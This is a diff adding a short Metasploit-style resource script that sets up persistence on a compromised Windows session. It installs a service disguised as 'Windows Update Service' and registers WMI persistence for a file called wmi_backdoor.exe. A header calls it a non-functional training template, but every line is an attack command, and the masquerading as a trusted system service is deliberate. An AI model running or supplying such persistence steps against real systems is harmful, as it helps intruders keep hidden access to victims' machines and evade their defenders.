@@ -1,0 +1,15 @@
+# Service Persistence Template
+# For Training Use – Non-functional Template
+
+use post/windows/manage/install_service
+set SESSION 1
+set SERVICENAME WindowsUpdate
+set SERVICEDISPLAYNAME Windows Update Service
+set SERVICEDESC Provides software updates
+set REXEPATH /tmp/service.exe
+run
+
+use post/windows/manage/wmi_persistence
+set SESSION 1
+set REXEPATH /tmp/wmi_backdoor.exe
+run
